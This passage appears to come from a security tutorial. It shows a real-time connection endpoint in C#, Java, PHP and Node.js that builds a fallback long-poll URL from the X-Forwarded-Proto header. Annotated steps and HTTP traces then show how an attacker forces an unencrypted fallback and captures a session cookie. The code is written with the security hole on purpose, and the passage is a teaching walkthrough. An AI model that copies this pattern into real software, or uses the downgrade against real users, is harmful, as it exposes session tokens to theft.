    // [4]
    var fallbackUrl = $"{scheme}://{host}/api/v1/realtime/long-poll";

    return Ok(new 
    {
        ConnectionId = Guid.NewGuid().ToString(),
        AvailableTransports = new[] { "WebSockets", "ServerSentEvents", "LongPolling" },
        FallbackUrl = fallbackUrl
    });
}
```
{% endtab %}

{% tab title="Java" %}
```java
@GetMapping("/api/v1/realtime/negotiate")
public ResponseEntity<?> negotiateConnection(HttpServletRequest request) {
    // [1]
    // [2]
    // [3]
    String forwardedProto = request.getHeader("X-Forwarded-Proto");
    String scheme = (forwardedProto != null && !forwardedProto.isEmpty()) ? forwardedProto : request.getScheme();
    String host = request.getServerName();

    // [4]
    String fallbackUrl = scheme + "://" + host + "/api/v1/realtime/long-poll";

    return ResponseEntity.ok(Map.of(
        "ConnectionId", UUID.randomUUID().toString(),
        "AvailableTransports", List.of("WebSockets", "ServerSentEvents", "LongPolling"),
        "FallbackUrl", fallbackUrl
    ));
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function negotiateConnection(Request $request) 
{
    // [1]
    // [2]
    // [3]
    $scheme = $request->header('X-Forwarded-Proto', $request->getScheme());
    $host = $request->getHost();

    // [4]
    $fallbackUrl = "{$scheme}://{$host}/api/v1/realtime/long-poll";

    return response()->json([
        'ConnectionId' => (string) Str::uuid(),
        'AvailableTransports' => ['WebSockets', 'ServerSentEvents', 'LongPolling'],
        'FallbackUrl' => $fallbackUrl
    ]);
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.get('/api/v1/realtime/negotiate', (req, res) => {
    // [1]
    // [2]
    // [3]
    let scheme = req.headers['x-forwarded-proto'] || req.protocol;
    let host = req.get('host');

    // [4]
    let fallbackUrl = `${scheme}://${host}/api/v1/realtime/long-poll`;

    res.json({
        ConnectionId: crypto.randomUUID(),
        AvailableTransports: ["WebSockets", "ServerSentEvents", "LongPolling"],
        FallbackUrl: fallbackUrl
    });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The real-time connection negotiation begins. The client requests the available endpoints to establish the data stream, \[2] To support dynamic multi-tenant environments without hardcoding URLs in configuration files, the developer dynamically generates the routing paths based on incoming HTTP headers, \[3] The architecture retrieves the protocol from the `X-Forwarded-Proto` header. If the edge load balancer fails to inject this header properly during the TLS termination phase, or an attacker manipulates a non-HSTS connection, the framework defaults to reading the raw socket protocol (which is `http` behind the load balancer), \[4] The fatal transport downgrade. The backend constructs the `FallbackUrl` using the unencrypted `http://` scheme. When the frontend attempts and fails to upgrade to a WebSocket, it blindly trusts this payload and initiates an unencrypted Long-Polling connection, sacrificing transport layer security entirely

```http
// 1. Attacker (positioned on public WiFi) intercepts the initial HTTP negotiation.
// The attacker explicitly removes or manipulates the X-Forwarded-Proto header, 
// or exploits a missing HSTS policy to force an HTTP connection.
GET /api/v1/realtime/negotiate HTTP/1.1
Host: trading.enterprise.tld
Cookie: SessionToken=VALID_VICTIM_TOKEN

// 2. Server dynamically builds the payload based on the unencrypted context.
HTTP/1.1 200 OK
Content-Type: application/json

{
  "ConnectionId": "a1b2c3d4",
  "AvailableTransports": ["WebSockets", "ServerSentEvents", "LongPolling"],
  "FallbackUrl": "http://trading.enterprise.tld/api/v1/realtime/long-poll"
}
```

```http
// 3. Attacker actively blocks TCP port 443 WSS upgrade packets to force fallback.
// 4. Victim's browser gracefully degrades and connects to the unencrypted URL.
GET /api/v1/realtime/long-poll?id=a1b2c3d4 HTTP/1.1
Host: trading.enterprise.tld
Cookie: SessionToken=VALID_VICTIM_TOKEN
```
{% endstep %}

{% step %}
To guarantee dashboard availability behind aggressive corporate firewalls, developers implemented a robust fallback mechanism from WebSockets to HTTP Long-Polling. By dynamically generating the fallback routing URLs based on the incoming request context, they introduced a structural weakness. When the TLS-terminating load balancer failed to enforce the `X-Forwarded-Proto` header—or the attacker intercepted the initial handshake—the backend determined the execution context was `http`. It generated and served an unencrypted fallback URL to the client. Upon experiencing a forced WebSocket failure, the client's transport library automatically degraded to the provided unencrypted URL, transmitting the highly sensitive Session Cookie in cleartext over the public network and exposing it to immediate interception
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
